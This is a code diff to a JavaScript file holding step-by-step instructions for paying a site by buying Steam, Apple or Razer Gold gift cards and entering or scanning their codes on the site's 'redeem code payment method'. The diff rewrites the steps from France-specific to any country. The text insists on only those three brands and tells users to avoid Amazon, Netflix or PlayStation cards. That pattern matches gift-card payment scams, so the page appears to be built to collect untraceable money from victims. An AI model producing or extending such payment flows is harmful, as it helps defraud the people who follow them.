@@ -50,42 +50,59 @@ function initializeState() {
                 {
                     image: "/src/images/online-1.jpg",
                     title: "Step 1: Visit a Trusted Gift Card Website",
-                    description: `Start by visiting a secure and trusted French website where digital gift cards are sold. In this image, the user is on a site like <a href="https://www.giftcards-website.fr" target="_blank">giftcards-website.fr</a>, where Steam, Apple, and Razer Gold cards are listed. Make sure the address bar shows "https://" and a padlock icon to confirm it’s secure. Then click on “Parcourir” to view available cards.`
+                    description: `Start by visiting a secure and trusted website in your country where digital gift cards are sold. Look for reputable platforms that list Steam, Apple, and Razer Gold cards. Before proceeding, always check that: The web address begins with “https://”
+A padlock icon appears in the address bar, confirming it’s secure. Once you’re sure the site is legitimate, browse the available cards and choose your preferred option.`
                 },
                 {
                     image: "/src/images/online-2.jpg",
                     title: "Step 2: Choose the Gift Card Type",
-                    description: "Here, the user selects a gift card from the available options on a secure French site. Only select accepted brands: Steam, Apple, or Razer Gold. In the image, the user taps on a €50 Apple card. Make sure the card is clearly marked with the correct value and brand before continuing."
+                    description:"From the available options on the secure website, select your preferred gift card. Only choose from the accepted brands: Steam, Apple, or Razer Gold.
+Before continuing, make sure:
+The card clearly displays the correct value (e.g., $50, £50, €50, or your local currency equivalent). The brand logo is correct and matches the one you need. In the example shown, the user selects a $50 Apple card, but you can choose any of the accepted brands based on your preference."
                 },
                 {
                     image: "/src/images/online-3.jpg",
                     title: "Step 3: Enter Payment Details Securely",
-                    description: "Now you're on the Paiement sécurisé page. Fill in your credit card number, expiration date, CVV (cryptogramme visuel), and billing address. Make sure the details are accurate. Then click the Continuer button to confirm your payment. Always ensure you're on a secure website before entering this information."
+                    description: `Once you reach the secure payment page, enter your credit or debit card information, including:
+<br/>
+Card number
+<br/>
+Expiration date
+<br/>
+CVV/security code (the 3-digit code on the back of your card)
+<br/>
+Billing address
+<br/><br/>
+
+Double-check that all details are correct before proceeding.
+<br/>
+Click the Continue or Pay button to confirm your payment.<br/>
+Always make sure the website is secure (look for “https://” and a padlock icon in the address bar) before entering any personal or payment information.`
                 },
                 {
                     image: "/src/images/online-4.jpg",
                     title: "Step 4: Payment Confirmation Screen",
-                    description: `After completing your payment, you’ll see a confirmation message like this:
-'Merci pour votre commande' (Thank you for your order).
+                    description: `After completing your payment, you’ll see a confirmation message on the website, such as “Thank you for your order.”
 <br/>
-It also states that a confirmation email has been sent to you. Tap 'Retour à la commande' if you'd like to return to the site or view more details. Now check your email inbox to receive your digital gift card code.`
+You should also receive a confirmation email containing your purchase details. If there’s an option to return to the order page or view more details, you can click it to check the status of your purchase. Next, open your email inbox and look for the confirmation email. Inside, you’ll find your digital gift card code or instructions on how to access it.`
                 },
                 {
                     image: "/src/images/online-5.jpg",
                     title: "Step 5: Open Your Email and Copy the Gift Card Code",
-                    description: "You’ll receive an email like this titled 'Votre code de carte cadeau numérique' (Your digital gift card code). It includes the code you’ll need to redeem on the payment platform. Carefully copy the code exactly as shown. Keep the email saved in case you need to refer back to it later."
+                    description: "You’ll receive an email with your digital gift card code. This code is required to redeem your gift card on our redeem code payment method. Carefully copy the code exactly as it appears in the email to avoid errors. Keep the email saved in a safe place in case you need to refer to it again later. Once you have the code, you can proceed to our redeem code payment method to activate and use your gift card balance."
                 }
             ],
             store: [
                 {
                     image: "/src/images/store-1.jpg",
                     title: "Step 1: Walk Into the Store",
-                    description: "Start the physical gift card process by walking into a major retail store or supermarket in France. Look for stores like Carrefour, Monoprix, Intermarché, or Fnac. These places usually have a dedicated section for gift cards. Once inside, head toward the electronics, checkout, or prepaid card section."
+                    description:"Start the physical gift card process by walking into a major retail store, supermarket, or electronics shop in your country. Look for well-known chains or local stores that sell gift cards,these can often be found in supermarkets, convenience stores, tech shops, bookstores, or department stores. Most places have a dedicated section for gift cards, usually located near the electronics area, the checkout counters, or the prepaid card display. Once inside, simply head to that section to browse the available options."
                 },
                 {
                     image: "/src/images/store-2.jpg",
                     title: "Step 2: Locate the Gift Card Section and Select an Accepted Card",
-                    description: "Inside the store, look for the rack labeled 'Cartes Cadeaux' (Gift Cards). You’ll find many brands, but only choose from these three: Steam, Apple, Razer Gold. <br/> Make sure the card is sealed and check the amount written on it, such as €20 or €50. Avoid buying unaccepted cards like Amazon, Netflix, or PlayStation"
+                    description: "Inside the store, head to the area where gift cards are displayed. This is often a dedicated rack or wall near the electronics section, the checkout counters, or the customer service desk. You’ll find many brands available, but only choose from these accepted options: Steam, Apple, or Razer Gold. Before purchasing, make sure:
+The card is sealed and undamaged. The amount is clearly marked (e.g., $20, $50, £20, €50, or the local currency equivalent). Avoid buying unaccepted cards such as Amazon, Netflix, or PlayStation."
                 },
                 {
                     image: "/src/images/store-3.jpg",
@@ -100,11 +117,11 @@ It also states that a confirmation email has been sent to you. Tap 'Retour à la
                 {
                     image: "/src/images/store-5.jpg",
                     title: "Step 5: Enter the Code on Our Payment Platform",
-                    description: "Once the code is revealed, visit our redeem code payment site. Type in the exact characters shown on the card into the Enter Code box. Select the correct Card Type (Steam, Apple, or Razer Gold), enter the Amount, and then tap Redeem to finalize the process. <br/>Make sure the code is correctly entered — no spaces or typos."
+                    description: "Once the code is revealed, visit our redeem code payment method. Type in the exact characters shown on the card into the Enter Code box. Select the correct Card Type (Steam, Apple, or Razer Gold), enter the Amount, and then tap Redeem to finalize the process. <br/>Make sure the code is correctly entered — no spaces or typos."
                 },
                 {
                     image: "/src/images/store-6.jpg",
-                    title: "Step 6: Use Scan Code to Upload the Card Photo", description: " Instead of typing the code manually, you can scan the gift card using your phone. Just tap the Scan Code button on the site and position the card in front of your camera. <br/>Make sure the code is clearly visible and fully within the frame. The system will automatically read and extract the code from the image for payment.",
+                    title: "Step 6: Use Scan Code to Upload the Card Photo", description: " Instead of typing the code manually, you can scan the gift card using your phone. Just tap the Scan Code button and position the card in front of your camera. <br/>Make sure the code is clearly visible and fully within the frame. The system will automatically read and extract the code from the image for payment.",
                 },
             ]
         },
